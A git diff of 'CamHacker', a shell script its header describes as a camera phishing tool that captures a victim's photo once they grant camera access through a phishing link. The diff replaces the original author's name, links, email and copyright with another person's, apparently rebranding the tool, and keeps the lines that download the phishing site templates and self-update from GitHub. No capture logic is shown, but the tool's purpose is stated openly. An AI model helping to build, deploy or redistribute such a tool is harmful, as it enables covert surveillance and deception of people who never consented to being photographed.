@@ -3,13 +3,13 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
+# Author     : techrayyan
+# Github     : https://github.com/techrayyan
+# Email      : techrayyan002@gmail.com
 # Credits    : Noob-Hackers, TechChipNet, LinuxChoice
 # Date       : 5-09-2021
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : techrayyan (2025-2026)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +17,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 techrayyan
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -367,14 +367,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/techrayyan/CamHacker/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/techrayyan/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -382,7 +382,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/techrayyan/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -505,14 +505,14 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[techrayyan]
+$red[Github]     ${cyan} :[https://github.com/techrayyan]
+$red[Messenger]  ${cyan} :[https://m.me/techrayyan]
+$red[Email]      ${cyan} :[techrayyan002@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/techrayyan/About"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -537,7 +537,7 @@ fi
 if ! [ -d sites ]; then
     mkdir sites
     netcheck
-    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/techrayyan/CamHacker/releases/latest/download/websites.zip"
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
